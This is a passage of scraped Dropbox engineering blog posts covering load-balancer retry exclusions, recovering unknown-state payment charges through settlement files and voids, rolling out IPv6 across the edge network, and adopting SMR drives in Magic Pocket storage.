almost the same for each backend and doesn’t depend on their processing time. Other methods (absolute least connections, least connections of N random choices and pinning peer) send more requests to the backends with smaller processing times. Request distribution per host Better distribution when using random choices and pinning-peer methods reduces total processing time and increases the total request rate across all backends. Request rates and total processing time for each load-balancing method Exclusion in retry attempts It is important to support the exclusion of backends that were previously tried during retry attempts. Otherwise there is some probability that future retry attempts could be made with the same bad/unhealthy hosts. The next graph shows the ratio of failed requests to total requests for each load-balancing method, with and without exclusions. In this scenario 20% of all hosts were failing hosts. A maximum of four retry attempts were configured. A failed/unhealthy host in this test environment was a host that immediately replied with an error status code. The effects of exclusion on load-balancing methods As you can see from the results in the graph above, enabling exclusions reduced the error rate for all tested methods except pinning peer. This was expected because retry attempts in the case of pinning peer won’t make much difference—the worker is host bound and will attempt all retries with one host. That’s all for this post! In the future, look out for further posts on Bandaid, including: Publishing Bandaid performance test data Open sourcing Bandaid [1] How TCP backlog works in Linux [2] The Power of Two Random Choices: A Survey of Techniques and Results [pdf] We’re hiring! Do you like traffic-related stuff? Dropbox has a globally distributed edge network, terabits of traffic, millions of requests per second, and a small team in Mountain View, CA. The Traffic team is hiring both SWEs and SREs to work on TCP/IP packet processors and load balancers, HTTP/2 proxies, and our internal gRPC-based service mesh. Not your thing? We’re also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . // Tags Infrastructure Service Proxy Service Oriented Architecture Bandaid // Copy link Link copied Link copied", "date": "2018-03-01"},
{"website": "Dropbox", "title": "Handling system failures during payment communication", "author": ["Jessica Fisher"], "link": "https://dropbox.tech/infrastructure/handling-system-failures-during-payment-communication", "abstract": "The solution: No charge unaccounted for Determining the Charge Status Reversing a Successful Charge Why does Dropbox need a Monetization Platform Team? Handling system failures during payment processing requires real-time identification of the issues in addition to offline detection, with the goal of eventual consistency. No matter what goes wrong, our top priority is to make sure that customers receive service for which they’ve been charged, and aren’t charged for service they haven’t received. Accurate payment processing is a crucial element in being worthy of trust, a core Dropbox company value. In a standard system of this kind, failures might result in page load errors or a failed database transaction. System failures during a charge request can result in uncertainty about where the money for that request ended up: is it in our company’s account or still in the customer’s account? These system failures are extremely rare, but when processing as many transactions a day as Dropbox does, even a small probability can lead to multiple occurrences a day. Designing payments infrastructure that can resolve issues such as these is vital to keeping our customers’ trust and providing our finance team with accurate information. In order to understand how system failures can disrupt payment processing, it’s important to understand each step involved in handling a customer’s purchase. When a customer visits the Dropbox website and elects to buy one of our products, we ask the customer to enter their payment information on the purchase form. After the customer submits the form, the system collects their payment information and securely sends it, as well as the amount we want to charge, to one of our external partners responsible for processing that type of payment information. For the purpose of this discussion, we’ll assume that the payment information in question is credit card information—not PayPal or other payment methods that Dropbox accepts. When our credit card partner receives the credit card information, they verify that the card is valid, store it for future charges (e.g. monthly recurring billing), and then attempt to charge the specified amount to the card. If the verification or charge fails, the credit card processor sends us a response containing a descriptive error code. In case of failure, we’ll refresh the purchase form, tell the customer that the charge attempt failed and ask the customer to try again. Otherwise, if the charge is successful, the credit card processor will respond with a success message as well as a token that we can use to reference the saved credit card for future charges. Upon receiving this success response, we store the payment result in our records. Finally, we will turn on the customer’s service—commonly called provisioning. Successful Payment Transaction Diagram As illustrated by the diagram above, we require communication with our external payment processor in order to complete the charge. This external communication involves side effects —changes in state as a result of the communication request. In particular, we care about whether money is moved from the customer’s account to the merchant’s account (Dropbox, in this case). In the presence of system failures, it can be unclear whether this occurred or not after making a request to an external system. There are three main failure points of this charging system described above: The network connectivity between Dropbox and the processor is disrupted causing communication timeouts or lost information. The result is either the external partner did not get our charge request or we did not get their charge response. The external partner has an internal error or machine failure causing us to not receive a charge response from the processor. We have an internal error or machine failure. Depending on the timing of this failure, two things could happen—either we are unable to send the charge request or unable to receive the charge response. All of these failure scenarios result in one of two distinct situations: The charge request is never processed by the external partner so no money is transferred. This is caused by either a) the network failing while the charge request is in flight to the external partner, b) the external partner has a system failure before they have a chance to process the charge request or c) we have a system failure before we send the charge request. The money is transferred but not recorded in our system. This is caused by either a) a network failure from the external partner back to us so we never receive the charge response or b) a system failure on our side prevents us from processing the charge response. In both cases, the core scenario is the same: a charge request was made but never marked completed in our system and is thus in an unknown state. After detecting occurrences of this scenario, the solution is to discover whether the charge request actually went through or not, then address this charge appropriately. The solution: No charge unaccounted for Detecting lost charges In order to detect incomplete charge requests, we record each charge request in our database before sending the information to our external partner. In this charge record, we store a customer identifier, the charge amount, as well as which payment processor the request will be sent to. The charge record also has a status attribute that tracks which part of the process the charge is in. Before we perform the charge, the charge record’s status is set to created . Next, we send the charge request to our external payment partner. When we receive the charge response from our partner, we update the charge record with a new status based on the response, normally either declined or successful. Charge Request Status Transition Diagram This status attribute of the charge request allows us to determine if a charge request was left in an unknown state. If the charge request has either the declined or successful status, then the charge response was correctly received and processed by our system. If the charge request has the created status, it’s necessary to look at the charge request’s creation time to figure out whether the request is in an unknown state or not. It’s possible that the charge request was only recently sent (milliseconds ago) and we could still get a charge response for it in the future. If the creation time is more than a couple minutes in the past (exact value depends on the timeout configurations) then we know that the charge request would’ve timed out by now so this request must be in an unknown state. To summarize, charge requests are in an unknown state if they have the created status and are more than a couple minutes old. A common way to solve a lost request is to simply reissue the request. However, this is not safe when the request has effects that should only happen one time. Each charge request could result in money being transferred out of a customer’s account. We never want to charge the customer multiple times for the same item so reissuing the charge request is dangerous. Even if we refund the extra charges later, the customer still sees the funds momentarily taken out of their account and this breaks the trust we want to establish with the customer. Since we don’t have an infallible detection system for the previous charge request’s state, it’s safer to abort the purchase attempt. Therefore, the system doesn’t grant a customer their Dropbox service until we have confirmation of a successful charge. The important result of this design decision is that if we discover a charge was successful but we have no record of it due to system failures, then the payment needs to be refunded since we would not have turned on the customer’s service in this case. Determining the Charge Status Now that there is a way to identify the transactions in an unknown state and clear steps on how to handle them if the customer was charged, the next step in this solution is to discover whether the charge went through or not. The charge status can usually be discovered by communicating with the external payment processor. Most payment processors provide a convenient API to look up a charge’s status by either a merchant identifier or a transaction identifier. The merchant identifier, otherwise known as a merchant order number, is a unique identifier supplied by the merchant (Dropbox in this case) to reference this charge request. The transaction id, that we internally refer to as the external transaction id, is determined by the external partner at the time of the charge and referenced in the charge response. Thus, we will only know the external transaction id for a charge request if we received and processed the charge response. In the case of system failures, as discussed in the problem description, we do not receive a charge response so we do not have the external transaction id. That leaves the merchant order number as our only available option to perform an API lookup with. Since Dropbox formulates and sends the merchant identifier to the external payment processor, we have access to it at the time we’re making the charge request and store the value on the charge request record. Using this merchant identifier, we do a lookup for matching transactions using the payment processor’s API. If a matching transaction is found, we update the charge request record with either a declined or successful status as appropriate based on the transaction’s status. On the other hand, if a matching transaction could not be found, we need another way to resolve the transaction status. This case is possible if the external payment processor has a system failure after they perform the charge but before they are able to record the charge in their own system. In addition, this case is also caused by an internal error on our side if the merchant identifier is not correctly recorded for the transaction so we are unable to use the merchant identifier with the processor’s lookup API. In the case when the lookup API cannot be used, the transaction’s status can still be found in the processor’s settlement files. Every payment processor offers settlement files available for download for each merchant that they service. These settlement files contain a list of every successful transaction that was processed on behalf of that merchant in addition to other information, normally split into 24 hour time periods. Each settlement record includes the external transaction id and merchant identifier fields mentioned earlier, so if lookup through the processor’s API fails, a search through the settlement file for a matching record may be successful. If a match is found, then the charge record’s status is changed to successful . If a match is not found, then the charge record’s status is changed to error to acknowledge that something went wrong during the charge request and we are unable to determine what occurred. Additionally, the settlement file allows us to discover any successful charges which we have no record of due to internal bugs in our system or rare database failures. For this reason, we set up a background process which parses these settlement files and verifies that we have a charge record in our system for each settlement record. For any settlement record without a charge record, a charge record is created with information from the settlement file. With this process, we assert that all successful charges will have a corresponding record in our system. Note, this achieves the goal of eventual consistency since the settlement files arrive up to several days after the charge was performed and we don’t make the charge record until we have the settlement file. Reversing a Successful Charge Occasionally, a charge is successfully applied for a user but we aren’t notified about it right away and thus don’t provision service for the user. In such cases, we need to return the customer’s money as soon as we are notified by the payment processor of the charge. There are two ways to reverse a payment: voiding or refunding. The decision of which method to use is influenced by many things. First, the cost of using an external payment processor involves fees that are assessed on each transaction that we perform through their platform. Voiding a charge, which is basically cancelling it, normally does not cost a fee. Refunding a charge, however, involves performing another payment in the opposite direction for which we need to pay a fee. Therefore, voiding a charge is cheaper than refunding the charge. Second, a voided charge will not show up on a customer’s end of month bank statement at all. Conversely, refunding the charge results in both the original charge and the refund payment being present on the bank statement. This could come as quite the surprise for the customer. From the customer’s perspective, the purchase form submission either returned an error or crashed with a 500 error (if an internal system failure occurred) and yet the customer sees evidence that we charged them. Even though we returned the money, this is still a negative experience for the customer. Third, if the charge request is successful and then we refund this charge later, there is a clear period of time between the charge and the refund during which the customer has less money in their account than they should have. Generally, this is a small amount of money but for some customers this could have a serious impact on their ability to complete other transactions while they are waiting for the refund. For these reasons, voiding is superior to refunding. Unfortunately, the ability to void a transaction depends on the how long it’s been since the charge was completed. To understand why the timing matters, it is necessary to know the steps of fulfilling a charge request. When the payment processor receives the charge request, they record the request in their system, verify the payment information and then ask the credit card company to perform the charge. The credit card company responds that they accept the charge and apply it to the card. At this point the payment processor responds to us, the merchant, to say that the charge was successful. However, at this point, the payment is only “submitted for settlement” and the charge may not have settled on the card yet. Settlement means that the funds have been transferred and the charge can no longer be cancelled. For this reason, voids can only occur during the time window when the payment is in the “submitted for settlement” state, but not yet settled. This time window generally lasts less than 24 hours. If this time window has passed, then a refund must be performed instead. Regardless of which method is used to reverse the transaction, once the reversal is complete, then our records and the customer’s account are now in the correct state. This combination of immediate mitigation and eventual consistency protects us from losing track of payments due to system failures which allows us to confidently assert that we are aware of all payments flowing through our system. This is just one of the ways that the monetization platform team makes sure that Dropbox is being worthy of trust. Why does Dropbox need a Monetization Platform Team? Thanks for reading our first blog post! The Monetization Platform team is based out of Dropbox’s Seattle office and we’re excited to share some of the things we work on. Learn more about the Monetization Platform team and why we exist in this feature story on The Muse. View from the Seattle Office // Tags Infrastructure Handling Failures Payments // Copy link Link copied Link copied", "date": "2017-09-29"},
{"website": "Dropbox", "title": "Deploying IPv6 in Dropbox Edge Network", "author": ["Hwyuan"], "link": "https://dropbox.tech/infrastructure/deploying-ipv6-in-dropbox-edge-network", "abstract": "Why IPv6 in edge network IPv6 traffic flow in edge network Why IPv6 in edge network IPv6 traffic flow in edge network IPv6 network design Software stack updates Roullout IPv6 statistics and performance Conclusion We're hiring! In the past few months, we have gradually enabled IPv6 for all user-facing services in Dropbox edge network. We are serving about 15% of daily user requests in IPv6 globally. In this article, we share our experiences and lessons from enabling IPv6 in the edge network. We will cover the IPv6 design in the edge, the changes we made to support IPv6, how IPv6 was tested and rolled out to users, and issues we encountered. Note that this article is not about enabling IPv6 for internal services in our data centers, but rather focuses on making IPv6 available to users. Why IPv6 in edge network The Internet Protocol (IP) has been a great success and powers the ever-growing Internet. However, it has long been known that the network address space in Internet Protocol version 4 (IPv4 or v4) would eventually be exhausted. Internet Protocol version 6 (IPv6 or v6) was proposed in the 1990s to address this. Even though the IPv6 transition is inevitable, only recently has IPv6 started to gain a considerable amount of adoption based on measurements from multiple companies and organizations. As announced earlier this year, Dropbox desktop client software already supports working in an IPv6-only environment . Enabling IPv6 for Dropbox services will benefit users who have IPv6 connectivity, prepare us for an IPv6 traffic-heavy network environment in the future, and contribute to the global efforts that promote IPv6 adoption. The Dropbox edge network consists of multiple Points of Presence (PoPs) distributed globally in order to reduce latency and increase throughput. As of today, the majority of our user traffic (such as web browsing, file uploading & downloading) is served through the edge network. Enabling IPv6 in the edge network will make most of our services operate in a dual-stack environment. We have also added IPv6 support in our data centers (DCs), though it will take more effort to enable IPv6 for all internal services. IPv6 traffic flow in edge network Each PoP consists of multiple layer-4 (L4) load balancers and layer-7 (L7) proxies, where our L4 load balancers are built on top of the IPVS kernel module and L7 proxies use the open-source Nginx software. For each service, such as www.dropbox.com , a Virtual IP (VIP) is announced via Border Gateway Protocol (BGP), and this VIP is also advertised in DNS. User traffic sent to this VIP is distributed to IPVS based on equal-cost multi-path routing by routers in the PoP. IPVS then forwards traffic to Nginx, which performs early TLS termination and proxies user traffic via secured HTTPs connections to DCs. We leverage Direct Server Reply (DSR) for the HTTPs responses (i.e., egress traffic) so that IPVS only needs to process ingress traffic. Why IPv6 in edge network The Internet Protocol (IP) has been a great success and powers the ever-growing Internet. However, it has long been known that the network address space in Internet Protocol version 4 (IPv4 or v4) would eventually be exhausted. Internet Protocol version 6 (IPv6 or v6) was proposed in the 1990s to address this. Even though the IPv6 transition is inevitable, only recently has IPv6 started to gain a considerable amount of adoption based on measurements from multiple companies and organizations. As announced earlier this year, Dropbox desktop client software already supports working in an IPv6-only environment . Enabling IPv6 for Dropbox services will benefit users who have IPv6 connectivity, prepare us for an IPv6 traffic-heavy network environment in the future, and contribute to the global efforts that promote IPv6 adoption. The Dropbox edge network consists of multiple Points of Presence (PoPs) distributed globally in order to reduce latency and increase throughput. As of today, the majority of our user traffic (such as web browsing, file uploading & downloading) is served through the edge network. Enabling IPv6 in the edge network will make most of our services operate in a dual-stack environment. We have also added IPv6 support in our data centers (DCs), though it will take more effort to enable IPv6 for all internal services. IPv6 traffic flow in edge network Each PoP consists of multiple layer-4 (L4) load balancers and layer-7 (L7) proxies, where our L4 load balancers are built on top of the IPVS kernel module and L7 proxies use the open-source Nginx software. For each service, such as www.dropbox.com , a Virtual IP (VIP) is announced via Border Gateway Protocol (BGP), and this VIP is also advertised in DNS. User traffic sent to this VIP is distributed to IPVS based on equal-cost multi-path routing by routers in the PoP. IPVS then forwards traffic to Nginx, which performs early TLS termination and proxies user traffic via secured HTTPs connections to DCs. We leverage Direct Server Reply (DSR) for the HTTPs responses (i.e., egress traffic) so that IPVS only needs to process ingress traffic. The figure above shows the IPv6 traffic flow in our edge network. IPv6 requests are forwarded by IPVS to Nginx via IPv6 in IPv6 (IPIPv6) tunnels. Nginx then proxies these requests to DCs in IPv4. Similar load balancing schemes apply when IPv4 requests reach DCs and then get delivered to application servers, though everything happens in IPv4. Essentially, IPv6 requests are terminated at PoPs. IPv6 network design In Q4 2016 we started rolling out IPv6 across our entire network. We started first with dual-stacking all our links followed by making necessary changes to our routing protocols to support v6. Intermediate System to Intermediate System ( IS-IS ) which is a protocol-agnostic architecture and can easily support all address types including v4 and v6. This was our Interior Gateway Protocol (IGP) in the backbone, so there was no significant changes we had to make to support v6 for IS-IS. To have consistent routing for both v4 and v6, we chose IS-IS single-topology over multi-topology. After IS-IS, we had to make changes to BGP. We deployed separate BGP sessions for v4 and v6 but maintained the same routing policies across both of them to ensure routing symmetry. The third piece was Multi-Protocol Label Switch (MPLS-TE) that was deployed across our backbone to forward v4 traffic. We intended to use the same set of Label Switch Paths (LSPs) to forward v6 traffic. We could achieve that by using IGP short-cuts as defined in RFC 3906 . With the implementation of IGP-shortcuts, both v6 and v4 traffic were using the same set of MPLS-LSPs across the backbone. By the end of Q1 2017 we completed v6 roll-out across our data centers, backbone, and edge. As for public IPv6 address allocation, each PoP has a unique /48 address space which is advertised to external peers by the edge router in that PoP. Announcing the /48 v6 prefix to the external world only from that PoP guarantees that all user requests to an IPv6 VIP which belongs to this /48 address space enter Dropbox network via that PoP and terminate locally on the Ngnix machines in that PoP. Each /128 IPv6 VIP has a unique /64 prefix, and we announce this /64 prefix instead of the full /128 address from IPVS to routers in the PoP to be more memory-efficient (though only traffic sent to the /128 VIPs will be accepted in the PoPs). The IPv4 VIP is embedded as the last 32 bits of the IPv6 VIP to make it more operational friendly. Software stack updates The software stack in PoPs needed to be fully IPv6 compatible to handle IPv6 traffic. The applications running in our data centers also needed to be updated to properly work with client-side IPv6 addresses passed along in the X-Forwarded-For headers by Nginx. In our PoPs, both the IPVS kernel module and Nginx software support IPv6 natively, though we needed to update the in-house configuration management tools for them to work with IPv6. We use IPv6 in IPv6 tunneling between IPVS and Nginx so that the tunneled IPv6 user traffic can be correctly decapsulated on the Nginx side. Because IPv6 packet headers are longer than the ones in IPv4, the advertised TCP Maximum Segment Size (MSS) was reduced to 1400 bytes to work with tunneling. On the data center side, we updated our application servers to properly handle client-side IPv6 addresses embedded in the X-Forwarded-For header. The following lists some common IPv6 compatibility issues we saw when updating our code base: IPv6 address format: IPv6 addresses have a different format from IPv4 addresses, so code written with the assumption of IPv4 format would break, such as splitting the IP address by dot. Additionally, IPv6 addresses have multiple representation formats, so it’s always a good idea to unify the IPv6 address format before performing operations. Regular expressions: Regular expressions used for detecting IP addresses might only handle IPv4. These regular expressions need to be updated to work with IPv6. And again, keep in mind that there could be multiple ways to represent an IPv6 address. GeoIP library: The GeoIP library and databases may need to be updated to support looking up IPv6 addresses. The C extension could be helpful for optimizing performance. Access control: Last but not least, access control software and rulesets need to be updated to be IPv6 compatible. Roullout We first deployed IPv6 support in our infrastructure so that we could test without affecting production traffic. After that, we gradually enabled IPv6 for users, service by service. In this section, we present the rollout process in detail and the issues we encountered. Deploy IPv6 support in our infrastructure IPv6 was first deployed to our network infrastructure so that we had IPv6 working at PoPs. After that, we deployed the updated IPVS and Nginx software, at which point we started to announce IPv6 VIPs via BGP. The deployment was done PoP by PoP to minimize risks. The IPv6 VIPs were not added to DNS, so they were not visible to users. In this step, we tested IPv6 reachability and performance. In the meantime, internal teams could leverage these VIPs to perform end-to-end IPv6 testing for their codes in the application servers. Enable IPv6 for user-facing services To enable IPv6 for a service, we need to add an AAAA record for the related domain(s), and users will receive the IPv6 VIP when performing AAAA DNS queries. To support a smooth transition from IPv4-only to dual-stack network environments, efforts such as Happy Eyeball have been proposed and implemented in many client-side software (such as browsers and the Dropbox desktop client). In these software, clients prefer IPv6 connections but are still able to fall back to IPv4 if the IPv6 connection is broken or not performing well. As for DNS, either parallel DNS queries will be made, or AAAA DNS queries will be sent ahead of A queries. IPv6 request percentage increased as we enabled IPv6 for more services In the rollout process, IPv6 was enabled service by service, so that we could monitor the status and performance, as well as isolate the impact if something went wrong. To enable a new service, we typically performed an office test, a user traffic test, and then rolled out to production. The figure above shows the increased IPv6 request percentage (each data point represents the average during a 4-hour time window) as we gradually enabled IPv6 for more services in the edge network. Note that the spike at the beginning of June is from a user traffic test. Issues during deployment We ran into some initial hiccups during IPv6 deployment. One of them was whitelisting v6 /48 address from each PoP with our external peers. We learned that registering our v6 address space with RADb was not sufficient. We had to reach out to some of our providers to update their Access Control Lists (ACLs) to accept v6 routes. Unfortunately this occurrence seemed to be a lot more common than we anticipated which resulted in sub-optimal routing issues during our initial deployment. Luckily we could catch most of the anomalies during our internal testing before rolling it out to external users. We had to update our ACLs to accommodate for new functionality and roles that ICMPv6 has in the overall operation of IPv6, most common of which was Neighbor Discovery (ND). We had to reshuffle some of our ACL terms in accordance to RFC6192 to permit ICMPv6 above all other terms. Before doing that, we were very frequently running into issues while bringing up v6 eBGP peers as ND packets were getting blocked by our ACLs. DNS NXDOMAIN responses for AAAA queries are dangerous. Most dual-stack software will ensure a broken IPv6 connection has the opportunity to fall back to IPv4 to support a smooth transition from IPv4-only to dual-stack networks. However, DNS still represents a place where an IPv6-specific issue cannot easily fall back to IPv4 and may affect IPv4 as well. An NXDOMAIN response for AAAA queries essentially means there are not any records (neither A nor AAAA) exist. In this case, client software may not retry IPv4. Additionally, A queries could also be affected and receive NXDOMAIN if DNS resolvers cache the AAAA NXDOMAIN response. On a related note, Cloudflare has proposed an alternative DNS record type TYPE65536 that contains both A and AAAA answers, but for the purpose of reducing the overhead of additional DNS queries. IPv6 statistics and performance After IPv6 is enabled for all services in the edge network, we see about 15% of daily user requests reach us in IPv6 globally. PoPs in the US receive the highest IPv6 request percentages, followed by PoPs in Europe and APAC regions. IPv6 statistics To understand the IPv6 deployment status, we have measured the percentage of IPv6 requests across all Dropbox services with sampled traffic (last 15 minutes of each hour) on September 20th, 2017 (Wednesday). We present the IPv6 statistics for different countries/regions and ISPs. Countries/Regions. The heat map below shows the average IPv6 traffic percentage for each country. In this map, a darker blue color means higher percentage of IPv6 requests. IPv6 request percentage across all Dropbox services Similar as reported from others, we see higher IPv6 request rates in some European countries and the US. We also observe considerable IPv6 deployments in South America and the APAC region. The following figure lists the top 10 countries ranked by the IPv6 request percentage. Countries ranked by IPv6 Request Percentage ISPs. We have also looked into IPv6 statistics among ISPs. We selected the top 10 ISPs in terms of total number of IPv6 requests sent to our edge network during the measurement, and the following figure lists these ISPs ranked by IPv6 request percentage. We label each ISP with the continent code (i.e.., EU for Europe, SA for South America, and NA for North America) and a unique index within that continent. As can be seen, the top two ISPs (both are US mobile carriers) are getting close to 100% IPv6. Selected ISPs ranked by IPv6 Request Percentage The following is a list of IPv6 statistics reported from other organizations: Akamai IPv6 Adoption Visualization APNIC IPv6 Capable Rate Cisco IPv6 stats Google IPv6 Statistics World IPv6 Launch Measurements Performance It has been reported that IPv6 has better network performance compared to IPv4, especially in mobile networks. To understand IPv6 performance, we have measured the TCP Round Trip Time (RTT) on our API endpoint ( api.dropbox.com ), which is used mostly by our mobile clients. We have also looked into desktop client file download performance. TCP Round Trip Time. Many factors could contribute to the performance differences of IPv4 and IPv6, such as the additional delays introduced by NAT64/DNS64, performance advantages of newer hardware, client device performance, etc. Providing a fair IPv4 and IPv6 comparison is challenging. Ideally, the performance measurement should take place on the same client at the same time to minimize the impact of other factors. As we don’t have that capability from the server side, during our initial IPv6 deployment for the api endpoint ( api.dropbox.com ), we enabled IPv6 for only 50% of users via DNS for a few hours. This way, for an IPv6-heavy network (such as two of the US major mobile carriers), approximately 50% of users would connect to us via IPv6 while the other half via IPv4. We chose the api endpoint for this measurement because our mobile apps talk to this endpoint and thus most traffic will be from cellular networks. IPv6 shows better RTTs for two major US mobile carriers when IPv6 enabled for 50% of users We compared the TCP RTT performance for IPv4 and IPv6 connections. The TCP round trip time was measured using the TCP_INFO socket option, and the results were reported via the tcpinfo_rtt variable provided by Nginx. We could also look into TCP retransmission stats using tcpi_total_retrans , but because we have enabled BBR in our edge network , packet losses would not affect the throughput as significantly as when other congestion algorithms, such as cubic, were used. The above graph shows the average RTT values (with 95% confidence intervals) reported for clients from two US cellular networks that we knew were close to 100% IPv6. As can be seen from the figure, IPv6 does show slightly better performance over IPv4. However, without detailed client-side and network information, it is hard to say definitely where the IPv6 performance gain is from. Additionally, the actual time needed for each request also depends on the performance of application servers. File download speeds. File syncing is one of the most important functions people use Dropbox for, thus we looked into desktop client file download speeds after IPv6 was enabled. We calculated the download speeds based on HTTP response body lengths and request time collected on Nginx proxies in our JFK PoP. Only files that were larger than 100KB were included in the study to exclude the potential variance introduced by small files. Since file download performance could differ based on user’s ISP networks, we focused on file download speeds for users from the ISP that sent the largest number of IPv6 requests to us. Because this ISP was not yet close to 100% IPv6 based on our stats, we compared week-over-week (Mondays) file download speeds after IPv6 was enabled. Week over week (Mondays) file download speed comparison at JFK PoP for users from a specific ISP The figure above shows the file download speeds with different percentiles (pXX) for IPv4 and IPv6 after IPv6 was enabled, as well as the performance for IPv4 one week earlier (both were Mondays). From the figure, IPv6 file download speeds are faster than IPv4 after we enabled IPv6 at most percentiles, and the P90 performance (fastest download speeds) is comparable to IPv4. However, it is worth noting that this is not a strictly fair comparison because other factors could have contributed to the IPv6 performance gain. Comparing IPv6 performance with the IPv4 performance one week earlier, we could say that IPv6 performance is comparable to IPv4, and for lower percentiles, i.e., slower file download speeds, IPv6 also shows slightly better performance. Again, this is not a perfect comparison for IPv4 and IPv6, but we hope this provides some additional information for people who are interested in IPv6 performance. Conclusion In this article, we’ve shared our experiences of enabling IPv6 in our network. The challenges of the overall process have been greatly reduced as hardware and protocol support for IPv6 become more mature. The majority of our efforts were on deploying IPv6 in our infrastructure, updating our software stack to be IPv6 compatible, testing, and gradually rolling out to users. We hope this article is helpful for those who are looking into enabling IPv6 for their front-end services and also those who are interested in IPv6 in general, and we look forward to hearing your feedback. Contributors to this article: Alexey Ivanov, Dzmitry Markovich, Haowei Yuan, Naveen Oblumpally, and Ross Delinger We're hiring! Do you like traffic-related stuff? Dropbox has a globally distributed edge network, terabits of traffic, millions of requests per second, and a small team in Mountain View, CA. The Traffic team is hiring both SWEs and SREs to work on TCP/IP packet processors and load balancers, HTTP/2 proxies, and our internal gRPC-based service mesh. Not your thing? We’re also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . // Tags Infrastructure Networking Ipv6 Edge Network // Copy link Link copied Link copied", "date": "2017-11-09"},
{"website": "Dropbox", "title": "Extending Magic Pocket Innovation with the first petabyte scale SMR drive deployment", "author": ["Magic Pocket Hardware Engineering Teams"], "link": "https://dropbox.tech/infrastructure/extending-magic-pocket-innovation-with-the-first-petabyte-scale-smr-drive-deployment", "abstract": "What is SMR and why are we using it? Types of SMR Dropbox Storage Architecture Hardware Trade-offs Software Redesign The Challenges of Using SMR What’s Next? Conclusion Magic Pocket , the exabyte scale custom infrastructure we built to drive efficiency and performance for all Dropbox products, is an ongoing platform for innovation. We continually look for opportunities to increase storage density, reduce latency, improve reliability, and lower costs. The next step in this evolution is our new deployment of specially configured servers filled to capacity with high-density SMR (Shingled Magnetic Recording) drives. Dropbox is the first major tech company to adopt SMR technology, and we’re currently adding hundreds of petabytes of new capacity with these high-density servers at a significant cost savings over conventional PMR (Perpendicular Magnetic Recording) drives. Off the shelf, SMR drives have the reputation of being slower to write to than conventional drives. So the challenge has been to benefit from the cost savings of the denser drives without sacrificing performance . After all, our new products support active collaboration between small teams all the way up to the largest enterprise customers. That’s a lot of data to write, and the experience has to be fast. As with our initial Magic Pocket launch, we attacked the problem through inventive software and server architecture to ensure that this solution matched our standards for annual data durability of over 99.9999999999%, and availability of over 99.99%. Our ambition here is to use our expertise in software for large distributed systems to enable us to take advantage of the ongoing developments in drive technology before our competitors. We believe that future storage innovations, including solid-state-drives (SSDs), will benefit from the same architectural approaches we’re developing for SMRs, so that our investment now will pay off in multiples. In this post, we’ll describe our adoption of SMR HDD technology in the Dropbox Storage platform, Magic Pocket. We discuss why we’ve chosen to use SMR, hardware tradeoffs and considerations, and some of the challenges we encountered along the way. What is SMR and why are we using it? Conventional Perpendicular Magnetic Recording (PMR) HDDs allow random writes across the entire disk. Shingled Magnetic Recording (SMR) HDDs offer increased density by sacrificing random writes for forced sequential writes. Squeezing the tracks on SMR disks together causes the head to erase the next track. A small, conventional area at the outside diameter allows for caching random writes as well as using SSD. SMR HDDs offer greater bit density and better cost structure ($/GB), decreasing the total cost of ownership on denser hardware. Our goal is to build the highest density Storage servers, and SMR currently provides the highest capacity, ahead of the traditional storage alternative, PMR. Types of SMR There are three types of SMR HDDs to consider: Drive/Device Managed, Host Aware, and Host Managed SMR disks. While we originally evaluated both Host Aware and Host Managed SMR disks, we finally settled on Host Managed disks for our fleet. Drive or Device Managed SMR disks allow the host to treat them like conventional drives. Non-sequential writes are buffered in the small conventional area on each disk, and then later on transcribed to the sequential zones. This involves reading the data from the sequential zone and writing the original data merged with the new data back to the sequential zone. Host Aware drives allow a host that understands SMR disks to control the writing of the sequential zones. Hosts can open and close zones, monitor write pointers, partially write sequential zones and avoid conventional area caching and performance bottlenecks caused by rewriting zones. Host Aware drives offer more control than Drive Managed SMR, which is our defining priority. Host Managed SMR drives require the host to manage the sequential zones on its own. The drive does no copying of new data to sequential zones and no caching of data in the conventional area. Hosts must explicitly open, fill and close sequential zones. Host Managed SMR offer the most control over the way data is stored on the drive and is consistent with how we have built things before. Dropbox Storage Architecture Magic Pocket (MP) stores user data in blocks, with ~4MB being the max size. Blocks are organized in 1GB extents and the MP platform operates accordingly. Since these extents are written in an append-only fashion, and are immutable, the sequential writes of SMR are ideal for MP’s workload. Check out our blog post for an in-depth overview of Dropbox’s Magic Pocket architecture . Data center Hardware Trade-offs While implementing SMR disks, there were a number of hardware trade-offs we had to consider. We worked to optimize performance and data transfer speeds, but also needed to consider hardware reliability and total cost of ownership. This required us to look at just about every element of our hardware stack. Chassis density Our latest design fits approximately 100 LFF (Large Form Factor) disks in a single chassis, which makes them the densest storage system in production. The 100 LFF disk per chassis had design constraints of a physical limit of 4U in rack space in a 19” standard datacenter rack and a requirement to stay at a 42” depth limit. This keeps us from needing to design custom datacenter racks. We keep each rack limited to housing 8 fully configured chassis to avoid deviating from standard datacenter flooring specifications. Memory and CPU One thing that came out of our testing was the decision to increase the memory to 96GBs per host. We did this because we keep an in-memory index of blocks and their offsets/length on the disk. With 14TB SMR drives we significantly increased the capacity of an individual chassis; each machine will store 2.29 times more blocks than a chassis in our previous architecture. This means that our block index will need a proportional increase in memory resulting in 96GB per machine. We also had to slightly upgrade our CPUs by moving from 16 to 20 cores, 40 threads, per chassis. The additional processing power was necessary to keep the total chassis I/O performance above 40Gbps and 45Gbps for writes and reads. SAS Controller In order to further improve reliability and reduce complexity, we moved from a RAID controller to a Host Bus Adapter (HBA). The initial benefit to using RAID was to leverage the cache to reduce write latency. This proved a costly endeavor with a lot of overhead: we were creating individual RAID 0 and managing associated firmware and bugs in the raid controller only to expose a single block device. We also worked to enable Direct I/O to reduce CPU usage from double-buffering. An added benefit of removing the overhead of creating so many RAID 0 devices was cutting the overall provisioning time for this storage system from up to 2 hours total down to a quick 30 minutes. This allows us to focus more on realizing the technology and less time setting it up. Adding the HBA simplified our architecture at the expense of our initial cache device. We understood that any emerging technology is an exploration into the unknown. In order for us to reduce the amount of exposure we focused on removing complexity as a success criteria. Cache With the removal of the RAID controller, we discovered that we needed to compensate for the loss of write cache. Our solution to this was to add our own caching layer to maintain the performance requirements. An SSD drive could compensate for the decision to remove the RAID controller. In previous generations of storage systems, data from network had been directly written to the drives. Writing to large SMR drives is time-consuming so we needed to ensure the network doesn’t get stalled when the drives are busy. To make this process asynchronous and non-blocking, we added an SSD to cache the data which is then lazily flushed to the SMR disks in the background. While this design works for us now, we are seeing that as the density increases we are saturating the SATA bus and have a need to use another transfer protocol. We’ve discovered that we are 